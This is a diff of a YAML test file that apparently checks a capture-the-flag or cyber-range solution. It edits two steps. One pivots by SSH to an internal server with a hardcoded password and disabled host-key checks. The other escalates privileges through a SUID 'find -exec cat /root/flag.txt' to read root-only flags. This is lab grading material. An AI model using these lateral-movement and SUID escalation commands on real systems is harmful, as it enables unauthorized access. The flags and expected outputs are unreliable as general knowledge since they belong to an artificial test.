@@ -162,12 +162,12 @@ test:
       timeout: 20
 
     - name: "Pivot to internal server and read token 3"
-      command: "sshpass -p 'Pr0c_SSH_2025#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null svcproc@{target.internal} 'cat /home/svcproc/marker.txt' 2>/dev/null"
+      command: "sshpass -p 'Pr0c_SSH_2025#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null svcproc@{target.internal} 'cat /home/svcproc/marker.txt' 2>&1"
       expect: "p1v0t"
       timeout: 15
 
     - name: "Escalate privileges via SUID find and read token 4"
-      command: "sshpass -p 'Pr0c_SSH_2025#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null svcproc@{target.internal} 'find . -exec cat /root/flag.txt \\; -quit' 2>/dev/null"
+      command: "sshpass -p 'Pr0c_SSH_2025#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null svcproc@{target.internal} 'find . -exec cat /root/flag.txt \\; -quit' 2>&1"
       expect: "r00t3d"
       timeout: 15
 
